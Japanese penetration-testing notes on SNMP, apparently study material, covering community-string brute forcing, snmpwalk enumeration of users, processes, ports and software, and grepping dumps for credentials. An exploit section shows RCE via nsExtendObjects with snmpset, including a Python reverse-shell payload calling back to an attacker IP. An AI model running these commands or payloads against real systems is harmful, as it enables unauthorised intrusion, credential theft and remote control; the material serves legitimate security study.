# 特徴・目的

SNMP（Simple Network Management Protocol）は、ネットワークデバイスの監視や管理に使用されるプロトコルである。ペネトレーションテストの観点では、公開されているSNMPサービスを悪用することで、システム情報の取得や潜在的な脆弱性の発見が可能となる。

活用ポイント：
- 誤設定されたコミュニティストリング（≒パスワード。例：public/private など）を悪用
- MIB情報を取得し、OS情報・ネットワーク情報を特定
- 認証不要な書き込み可能な設定がある場合、設定変更やDoS攻撃の可能性
- SNMPv1, SNMPv2c は認証が脆弱であり、コミュニティストリングの推測が容易
- SNMPv3 は認証・暗号化が可能だが、適切に設定されていないケースもある

### onesixtyone

SNMPサービスを利用しているホストの列挙だけでなく、コミュニティストリングを明らかにする（[SNMPコミュニティとは](#SNMPコミュニティとは)）。

2. IPアドレスの一覧を用意する
```zsh
for ip in $(seq 1 254); do echo 192.168.1.$i; done > IPlist.txt
```

3. ブルートフォース
```zsh
onesixtyone -c <wordlist> -i IPlist.txt
```

```sh
# Scanning 254 hosts, 120 communities
# 192.168.115.151 [public] Hardware: AMD64 Family 25 Model 1 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
```

sudo nmap -sU -Pn --open -p 161,162 192.168.50.1-254 -oG open-smtp.txt

## MIB問合せによるターゲット情報入手 w/ snmpwalk

コミュニティストリングは基本的に"*public*"が使われる。

基本コマンド：[MIB値一覧](#MIB値一覧)に記載のOIDを問合せる
```zsh
# snmpバージョンは原則2cを使うが、エラーの場合は1をつかう
snmpwalk -c <コミュニティストリング> -v<snmpバージョン> <target_IP> <OID>
```

準備：MIBのリストをダウンロードする
```zsh
sudo apt install -y snmp snmp-mibs-downloader
sudo download-mibs
```

すべて問い合わせ（時間かかる）
```zsh
# これだけだと情報量多すぎる
snmpwalk -c <コミュニティストリング> -v<snmpバージョン> -t 10 <target_IP> -Oa | tee snmpwalk_all.txt

# コミュニティ文字列を特定
grep -i "trap" snmpwalk_all.txt

# ユーザー名やパスワードの抽出
grep -i "login\|fail" snmpwalk_all.txt

# メールアドレス抽出
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b"　snmpwalk_all.txt
```

>[!Warning]
>上記ですべて問い合わせしても機密情報が検出されるExtend機能は応答しない。

システム情報の列挙
```zsh
snmpwalk -c public -v2c <target_IP> SNMPv2-MIB::sysDescr
```

ユーザーの列挙
```zsh
snmpwalk -c public -v2c <target_IP> 1.3.6.1.4.1.77.1.2.25
```

ローカルでのみlistenしているポート含めTCPのopenポートを開示する
```zsh
snmpwalk -c public -v2c <target_IP> 1.3.6.1.2.1.6.13.1.3
```
- →Nmap結果には表示されなかったポートに要注目

**extend機能**(※)で実行したスクリプト/コマンドの内容を表示する
```zsh
snmpwalk -c public -v2c <target_IP> NET-SNMP-EXTEND-MIB::nsExtendObjects
# ↓出力例
# NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1
# NET-SNMP-EXTEND-MIB::nsExtendCommand."RESET" = STRING: ./home/john/RESET_PASSWD
```
- (※)SNMP経由でカスタムスクリプトやコマンドを実行し、その結果を取得できる機能で、システム管理者が標準のSNMP MIBにない独自の監視項目を追加するために使用される

実行中のプロセスの列挙
```zsh
snmpwalk -c public -v2c <target_IP> 1.3.6.1.2.1.25.4.2.1.2
```

インストール済みソフトウェアの列挙
```zsh
# MIBリストを活用
snmpwalk -c public -v2c <target_IP> HOST-RESOURCES-MIB::hrSWInstalledName
# OIDの利用
snmpwalk -c public -v2c <target_IP> 1.3.6.1.2.1.25.6.3.1.2
```
- →「実行中のプロセス」と「インストール済みソフトウェア」の情報から、**脆弱なアプリケーションやAVの存在がわかる**

# Exploit：nsExtendObjectsテーブルの悪用(RCE)

**書き込み権限**を持つコミュニティストリング（rwcommunity）（＝private等） があれば、RCE可能

1. コミュニティストリングが書き込み可能かを確認
```zsh
snmpset -c <RW_COMMUNITY_STRING> -v 2c <target_IP> 1.3.6.1.2.1.1.4.0 s "test"
# 成功：SNMPv2-MIB::sysContact.0 = STRING: test
# 失敗：noAccess
```

2. `nsExtendObjects`テーブルに新しい行を追加してコマンドを登録
	- 💡以降は[SNMP Shell - GitHub](https://github.com/mxrch/snmp-shell)を使い自動で可能
```zsh
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c <RW_COMMUNITY_STRING> <target_IP> \
'nsExtendStatus."<COMMAND_NAME>"' = createAndGo \
'nsExtendCommand."<COMMAND_NAME>"' = <ABSOLUTE_PATH_TO_EXECUTABLE> \
'nsExtendArgs."<COMMAND_NAME>"' = '<COMMAND_ARGUMENTS>'
````
↓例
```bash
# 基本
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
'nsExtendStatus."evilcommand"' = createAndGo \
'nsExtendCommand."evilcommand"' = /bin/echo \
'nsExtendArgs."evilcommand"' = 'hello world'

# リバースシェル
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c <RW_COMMUNITY_STRING> <target_IP> \
'nsExtendStatus."<COMMAND_NAME>"' = createAndGo \
'nsExtendCommand."<COMMAND_NAME>"' = <PYTHON3_PATH(e.g:/usr/bin/python3.6)> \
'nsExtendArgs."<COMMAND_NAME>"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"<attacker_IP>\",<Port>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
```
条件：
- 実行ファイルの**絶対パス**が必要
- バイナリ/スクリプトが存在し、実行可能

3. コマンド注入の確認
```zsh
snmpwalk -v2c -c <COMMUNITY_STRING> <target_IP> NET-SNMP-EXTEND-MIB::nsExtendObjects
```
- コミュニティストリングは、読み取り専用(publicなど)で良い

4. コマンドの実行
```zsh
snmpwalk -v2c -c <COMMUNITY_STRING> <target_IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull."<COMMAND_NAME>"
```

# 詳細

## 基本情報

### SNMP 基本機能

- SNMP(simple network management protocol)は、ネットワーク機器の状態管理・監視を行うもの
	- （ネットワークの状態管理・監視をするのはRMON）
- 基本的にUDPが使われる＝IP Spoofingやreplay attackの影響を受けやすい
	- エージェント = 161ポート
	- マネージャー = 162ポート
- SNMP マネージャーとSNMP エージェントがおり、マネージャーが管理し、エージェントが管理される側
- 基本的なマネージャーとエージェントのやり取りは、
	- 「ポーリング(GET, SET)」：マネージャーからリクエストを送りエージェントからレスポンスする
	- 「Trap」：エージェントから一方的にマネージャーに情報を送る、がある
- ほとんどが以下の3パターン

### MIBとは

- MIB(ミブ: Management Information Base)
- SMTP エージェントから収集された情報が格納される
- MIBには機器の状態がツリー構造で保存されている

### OIDとは

- MIBの構成要素をオブジェクトといい、それぞれにOIDが付いている。OIDはオブジェクトIDを階層ごとにつなげて示す。
- 特定の情報に辿り着くまでの==ファイルパス==のようなイメージ
- 例えば、以下赤枠のOIDは、1.3.6.1.2.1.6となる。
- OIDの番号は同階層の左から順番。

![ 400](../../画像ファイル/Pasted%20image%2020250309120112.png)

- 🔗参考リンク: [IBM: MIBとは](https://www.ibm.com/docs/en/aix/7.1?topic=management-information-base)

### SNMPコミュニティとは

- SNMPで管理するネットワークシステムの範囲のこと
- SNMPマネージャとSNMPエージェントとの間で、同じコミュニティ名にすることで情報を共有することができる
- 監視対象ごとに異なるコミュニティ名を設定することにより、効率的な管理とアクセス権限の分離を実現できる
	- 悪意ある第三者が不正なマネージャーを持ち込んでも通信できないように防ぐ

- コミュニティストリング(上記のPublic01)などが、コミュニティへアクセスする**認証情報**として用いられる

![](../../画像ファイル/Pasted%20image%2020250309104010.png)

### MIBへのアクセス権限一覧

- SNMPエージェントが権限を設定する

| MIBへのアクセス権限    | 説明                       |
| -------------- | ------------------------ |
| RO             | Read-only。MIB情報の読み取りが可能  |
| RW             | Read-write。MIB情報の読み書きが可能 |
| Read-write-all | コミュニティを含めてMIB情報の読み書きが可能  |
